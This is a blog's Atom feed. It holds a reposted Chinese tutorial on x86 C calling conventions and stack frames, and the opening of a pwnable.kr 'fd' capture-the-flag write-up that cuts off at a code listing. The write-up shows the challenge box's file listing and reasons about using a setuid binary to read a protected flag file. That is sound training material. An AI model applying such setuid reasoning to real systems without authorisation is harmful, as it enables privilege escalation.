<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>——Light!</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.smlight.xyz/"/>
  <updated>2019-04-19T08:29:44.061Z</updated>
  <id>https://www.smlight.xyz/</id>
  
  <author>
    <name>smlight</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C语言函数调用栈（二）</title>
    <link href="https://www.smlight.xyz/2019/04/19/c-stack-frame2/"/>
    <id>https://www.smlight.xyz/2019/04/19/c-stack-frame2/</id>
    <published>2019-04-19T08:01:19.000Z</published>
    <updated>2019-04-19T08:29:44.061Z</updated>
    
    <content type="html"><![CDATA[<h3 id="5-函数调用约定"><a href="#5-函数调用约定" class="headerlink" title="5 函数调用约定"></a>5 函数调用约定</h3><p>创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。</p><p>函数调用约定通常规定如下几方面内容：</p><p>1) 函数参数的传递顺序和方式</p><p>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</p><p>2) 栈的维护方式</p><p>主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p><p>3) 名字修饰(Name-mangling)策略</p><p>又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</p><p>若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p><h4 id="5-1-常见调用约定"><a href="#5-1-常见调用约定" class="headerlink" title="5.1 常见调用约定"></a>5.1 常见调用约定</h4><p>下面分别介绍常见的几种函数调用约定。</p><p>1) cdecl调用约定<br>又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p><blockquote><p>   【扩展阅读】可变参数函数支持条件<br>   若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。<br>   首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！<br>   其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。<br>   C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p></blockquote><p>2) stdcall调用约定(微软命名)<br>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。</p><p>3) fastcall调用约定<br>stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p><p>4) thiscall调用约定<br>C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p>thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p><p>注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p><p>5) naked call调用约定<br>对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><p>代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">__declspec(naked) <span class="keyword">int</span> __<span class="function">stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</div><div class="line">    ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</div><div class="line">    __asm mov eax, a</div><div class="line">    __asm add eax, b</div><div class="line">    __asm ret <span class="number">8</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>注意，__declspec是微软关键字，其他系统上可能没有。 </p><p>6) pascal调用约定<br>Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><p>Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p><p>上述调用约定的主要特点如下表所示：</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr style="background-color: #827e7d;"><br><td valign="top" width="130"><br><p style="text-align: center;"><strong>调用方式</strong></p><br></td><br><td style="text-align: center;" valign="top" width="130"><br><p><strong>stdcall(Win32)</strong></p><br></td><br><td style="text-align: center;" valign="top" width="83"><br><p><strong>cdecl</strong></p><br></td><br><td style="text-align: center;" valign="top" width="142"><br><p><strong>fastcall</strong></p><br></td><br><td style="text-align: center;" valign="top" width="118"><br><p><strong>thiscall(C++)</strong></p><br></td><br><td valign="top" width="83"><br><p style="text-align: center;"><strong>naked call</strong></p><br></td><br></tr><br><tr><br><td width="130"><br><p><strong>参数压栈顺序</strong></p><br></td><br><td valign="top" width="130"><br><p>从右至左</p><br></td><br><td valign="top" width="83"><br><p>从右至左</p><br></td><br><td valign="top" width="142"><br><p>从右至左，Arg1在ecx，Arg2在edx</p><br></td><br><td valign="top" width="118"><br><p>从右至左，this指针在ecx</p><br></td><br><td valign="top" width="83"><br><p>自定义</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p><strong>参数位置</strong></p><br></td><br><td valign="top" width="130"><br><p>栈</p><br></td><br><td valign="top" width="83"><br><p>栈</p><br></td><br><td valign="top" width="142"><br><p>栈 + 寄存器</p><br></td><br><td valign="top" width="118"><br><p>栈，寄存器ecx</p><br></td><br><td valign="top" width="83"><br><p>自定义</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p><strong>负责清栈的函数</strong></p><br></td><br><td valign="top" width="130"><br><p>被调函数</p><br></td><br><td valign="top" width="83"><br><p><span style="color: #ff0000;">主调函数</span></p><br></td><br><td valign="top" width="142"><br><p>被调函数</p><br></td><br><td valign="top" width="118"><br><p>被调函数</p><br></td><br><td valign="top" width="83"><br><p>自定义</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p><strong>支持可变参数</strong></p><br></td><br><td valign="top" width="130"><br><p>否</p><br></td><br><td valign="top" width="83"><br><p><span style="color: #ff0000;">是</span></p><br></td><br><td valign="top" width="142"><br><p>否</p><br></td><br><td valign="top" width="118"><br><p>否</p><br></td><br><td valign="top" width="83"><br><p>自定义</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p><strong>函数名字格式</strong></p><br></td><br><td valign="top" width="130"><br><p>_name@number</p><br></td><br><td valign="top" width="83"><br><p>_name</p><br></td><br><td valign="top" width="142"><br><p>@name@number</p><br></td><br><td valign="top" width="118"><br><p>&nbsp;</p><br></td><br><td valign="top" width="83"><br><p>自定义</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p><strong>参数表开始标识</strong></p><br></td><br><td valign="top" width="130"><br><p>“@@YG”</p><br></td><br><td valign="top" width="83"><br><p>“@@YA”</p><br></td><br><td valign="top" width="142"><br><p>“@@YI”</p><br></td><br><td valign="top" width="118"><br><p>&nbsp;</p><br></td><br><td valign="top" width="83"><br><p>自定义</p><br></td><br></tr><br><tr><br><td colspan="6" valign="top" width="685"><br><p>注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。</p><br><p>C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。</p><br><p>例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。</p><br></td><br></tr><br></tbody><br></table><p>代码示例如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> k)&#123;</div><div class="line"><span class="comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span></div><div class="line"><span class="comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span></div><div class="line">    <span class="keyword">return</span> i+j+k;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallerFunc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">    CalleeFunc(<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">    CallerFunc();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr style="background-color: #827e7d;"><br><td valign="top" width="80"><br><p><strong>&nbsp;</strong></p><br></td><br><td valign="top" width="201"><br><p><strong>cdecl</strong></p><br></td><br><td valign="top" width="201"><br><p><strong>stdcall</strong></p><br></td><br><td valign="top" width="229"><br><p><strong>fastcall</strong></p><br></td><br></tr><br><tr><br><td valign="top" width="80"><br><p><strong>主调函数职责</strong></p><br></td><br><td valign="top" width="201"><br><p>sub&nbsp;&nbsp; $0xc,%esp</p><br><p>movl&nbsp; $0x33,0x8(%esp)</p><br><p>movl&nbsp; $0x22,0x4(%esp)</p><br><p>movl&nbsp; $0x11,(%esp)</p><br><p>call&nbsp;&nbsp; 8048354 &lt;CalleeFunc&gt;</p><br></td><br><td valign="top" width="201"><br><p>sub&nbsp;&nbsp; $0xc,%esp</p><br><p>movl&nbsp; $0x33,0x8(%esp)</p><br><p>movl&nbsp; $0x22,0x4(%esp)</p><br><p>movl&nbsp; $0x11,(%esp)</p><br><p>call &nbsp;&nbsp;8048354 &lt;CalleeFunc&gt;</p><br><p><span style="color: #800080;">sub&nbsp;&nbsp; $0xc,%esp</span></p><br></td><br><td valign="top" width="229"><br><p>sub&nbsp;&nbsp; <span style="color: #800080;">$0x4</span>,%esp</p><br><p>movl&nbsp; $0x33,(%esp)</p><br><p>mov&nbsp; $0x22,<span style="color: #800080;">%edx</span></p><br><p>mov&nbsp; $0x11,<span style="color: #800080;">%ecx</span></p><br><p>call&nbsp;&nbsp; 8048354 &lt;CalleeFunc&gt;</p><br><p>sub&nbsp;&nbsp; <span style="color: #800080;">$0x4</span>,%esp</p><br></td><br></tr><br><tr><br><td valign="top" width="80"><br><p><strong>被调函数职责</strong></p><br></td><br><td valign="top" width="201"><br><p>&nbsp;push %ebp</p><br><p>mov&nbsp; %esp,%ebp</p><br><p>mov&nbsp; 0xc(%ebp),%eax</p><br><p>add&nbsp; 0x8(%ebp),%eax</p><br><p>add&nbsp; 0x10(%ebp),%eax</p><br><p>pop&nbsp; %ebp</p><br><p>ret</p><br></td><br><td valign="top" width="201"><br><p>push&nbsp; %ebp</p><br><p>mov&nbsp; %esp,%ebp</p><br><p>mov&nbsp; 0xc(%ebp),%eax</p><br><p>add&nbsp;&nbsp; 0x8(%ebp),%eax</p><br><p>add&nbsp;&nbsp; 0x10(%ebp),%eax</p><br><p>pop&nbsp;&nbsp; %ebp</p><br><p>ret &nbsp;&nbsp;&nbsp;<span style="color: #800080;">$0xc</span>&nbsp;</p><br><p>//执行ret指令并清理参数占用的堆栈(栈顶指针上移参数个数*4=12个字节，以释放压栈的参数)</p><br></td><br><td valign="top" width="229"><br><p>push &nbsp;%ebp</p><br><p>mov&nbsp; %esp,%ebp</p><br><p><span style="color: #800080;">sub&nbsp;&nbsp; $0x8,%esp</span></p><br><p>mov&nbsp; %ecx,0xfffffffc(%ebp)</p><br><p>mov&nbsp; %edx,0xfffffff8(%ebp)</p><br><p>mov&nbsp; 0xfffffff8(%ebp),%eax</p><br><p>add&nbsp;&nbsp; 0xfffffffc(%ebp),%eax</p><br><p>add&nbsp;&nbsp; 0x8(%ebp),%eax</p><br><p>leave</p><br><p>ret&nbsp;&nbsp;&nbsp;<span style="color: #800080;"> $0x4</span></p><br><p>//ret &lt;压栈参数字节数&gt;。若参数不超过两个，则ret指令不带立即数，因为无参数被压栈</p><br></td><br></tr><br></tbody><br></table><h4 id="5-2-调用约定影响"><a href="#5-2-调用约定影响" class="headerlink" title="5.2 调用约定影响"></a>5.2 调用约定影响</h4><p>当函数导出被其他程序员所使用(如库函数)时，该函数应遵循主要的调用约定，以便于程序员使用。若函数仅供内部使用，则其调用约定可只被使用该函数的程序所了解。</p><p>在多语言混合编程(包括A语言中使用B语言开发的第三方库)时，若函数的原型声明和函数体定义不一致或调用函数时声明了不同的函数约定，将可能导致严重问题(如堆栈被破坏)。</p><p>以Delphi调用C函数为例。Delphi函数缺省采用stdcall调用约定，而C函数缺省采用cdecl调用约定。一般将C函数声明为stdcall约定，如：int __stdcall add(int a, int b);</p><p>在Delphi中调用该函数时也应声明为stdcall约定：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(a: Integer; b: Integer)</span>:</span> Integer; <span class="keyword">stdcall</span>; <span class="comment">//参数类型应与DLL中的函数或过程参数类型一致，且引用时使用stdcall参数</span></div><div class="line"><span class="keyword">external</span> <span class="string">'a.dll'</span>; <span class="comment">//指定被调DLL文件的路径和名称</span></div></pre></td></tr></table></figure><p>不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)。</p><p>此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误(报告被调函数未定义)。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _cplusplus</span></div><div class="line">    <span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="function">type <span class="title">Func</span><span class="params">(type para)</span></span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _cplusplus</span></div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure><p>这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。</p><h4 id="5-3-x86函数参数传递方法"><a href="#5-3-x86函数参数传递方法" class="headerlink" title="5.3 x86函数参数传递方法"></a>5.3 x86函数参数传递方法</h4><p>x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序(下标0~N-1)与函数参数声明顺序(Para1~N)一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。</p><p>5.3.1 整型和指针参数的传递<br>整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr style="background-color: #827d7d;"><br><td valign="top" width="165"><br><p align="center"><strong>调用语句</strong></p><br></td><br><td valign="top" width="106"><br><p align="center"><strong>参数</strong></p><br></td><br><td valign="top" width="118"><br><p align="center"><strong>栈帧地址</strong></p><br></td><br></tr><br><tr><br><td rowspan="4" width="165"><br><p>tail(1, 2, 3, (void <em>)0);</em></p><br></td><br><td valign="top" width="106"><br><p style="text-align: center;">1</p><br></td><br><td style="text-align: center;" valign="top" width="118"><br><p>8(%ebp)</p><br></td><br></tr><br><tr><br><td valign="top" width="106"><br><p style="text-align: center;">2</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">12(%ebp)</p><br></td><br></tr><br><tr><br><td valign="top" width="106"><br><p style="text-align: center;">3</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">16(%ebp)</p><br></td><br></tr><br><tr><br><td style="text-align: center;" valign="top" width="106"><br><p>(void )0</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">20(%ebp)</p><br></td><br></tr><br></tbody><br></table><p>5.3.2 浮点参数的传递<br>浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr style="background-color: #827e7d;"><br><td valign="top" width="165"><br><p align="center"><strong>调用语句</strong></p><br></td><br><td valign="top" width="130"><br><p align="center"><strong>参数</strong></p><br></td><br><td valign="top" width="118"><br><p align="center"><strong>栈帧地址</strong></p><br></td><br></tr><br><tr><br><td rowspan="5" width="165"><br><p>tail(1.414, 2, 3.998e10);</p><br></td><br><td valign="top" width="130"><br><p style="text-align: center;">word 0: 1.414</p><br></td><br><td style="text-align: center;" valign="top" width="118"><br><p>8(%ebp)</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p style="text-align: center;">word 1: 1.414</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">12(%ebp)</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p style="text-align: center;">2</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">16(%ebp)</p><br></td><br></tr><br><tr><br><td valign="top" width="130"><br><p style="text-align: center;">word 0: 3.998e10</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">20(%ebp)</p><br></td><br></tr><br><tr><br><td style="text-align: center;" valign="top" width="130"><br><p>word 1: 3.998e10</p><br></td><br><td valign="top" width="118"><br><p style="text-align: center;">24(%ebp)</p><br></td><br></tr><br></tbody><br></table><p>5.3.3 结构体和联合体参数的传递</p><p>结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。</p><p>对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。</p><h4 id="5-4-x86函数返回值传递方法"><a href="#5-4-x86函数返回值传递方法" class="headerlink" title="5.4 x86函数返回值传递方法"></a>5.4 x86函数返回值传递方法</h4><p>函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时：</p><p>1) 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。</p><p>2) 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</p><p>3) 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。</p><p>4) 若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。</p><p>注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。</p><p>5) 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</p><p>函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</p><blockquote><p>   【扩展阅读】GCC返回结构体和联合体<br>   通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。<br>   GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。<br>   相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。<br>   在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。<br>   GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。<br>   在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。</p></blockquote><p><em>以上全文转载自：<a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a></em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;5-函数调用约定&quot;&gt;&lt;a href=&quot;#5-函数调用约定&quot; class=&quot;headerlink&quot; title=&quot;5 函数调用约定&quot;&gt;&lt;/a&gt;5 函数调用约定&lt;/h3&gt;&lt;p&gt;创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便
      
    
    </summary>
    
    
      <category term="Basic" scheme="https://www.smlight.xyz/tags/Basic/"/>
    
      <category term="CTF" scheme="https://www.smlight.xyz/tags/CTF/"/>
    
      <category term="PWN" scheme="https://www.smlight.xyz/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>pwnable初步体验</title>
    <link href="https://www.smlight.xyz/2018/09/24/pwnable-practice/"/>
    <id>https://www.smlight.xyz/2018/09/24/pwnable-practice/</id>
    <published>2018-09-24T02:43:03.000Z</published>
    <updated>2019-03-03T02:46:30.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-Toddler’s-Bottle"><a href="#0x0-Toddler’s-Bottle" class="headerlink" title="0x0 Toddler’s Bottle"></a>0x0 Toddler’s Bottle</h2><h3 id="0x00-fd"><a href="#0x00-fd" class="headerlink" title="0x00 fd"></a>0x00 fd</h3><p>首先稍微学习一下<em>file descriptor</em>，然后登录上去看看到底是什么情况。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">fd@ubuntu:~$ ls -alh</div><div class="line">total 40K</div><div class="line">drwxr-x---  5 root   fd   4.0K Oct 26  2016 .</div><div class="line">drwxr-xr-x 92 root   root 4.0K Aug 12 10:28 ..</div><div class="line">d---------  2 root   root 4.0K Jun 12  2014 .bash_history</div><div class="line">-rw-------  1 root   root  128 Oct 26  2016 .gdb_history</div><div class="line">dr-xr-xr-x  2 root   root 4.0K Dec 19  2016 .irssi</div><div class="line">drwxr-xr-x  2 root   root 4.0K Oct 23  2016 .pwntools-cache</div><div class="line">-r-sr-x---  1 fd_pwn fd   7.2K Jun 11  2014 fd</div><div class="line">-rw-r--r--  1 root   root  418 Jun 11  2014 fd.c</div><div class="line">-r--r-----  1 fd_pwn root   50 Jun 11  2014 flag</div></pre></td></tr></table></figure></p><p>可以看到除了隐藏文件就是 fd fd.c flag ，所以目标就是获取flag中的内容然后提交到网站上。<br>但是由于权限问题我们是不能直接查看flag文件的，实际上在不能成为root的情况下只有通过可执行文件fd才有可能操作flag文件，因为fd带有<em>Set UID</em>权限，在它运行的时候可以暂时获得fd_pwn这个用户的权限。那么剩下的那个fd.c文件可以推测是fd文件的源代码。<br>另外，fd用户对当前目录没有<em>write</em>权限，所以要通过查看fd.c分析fd的行为。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div 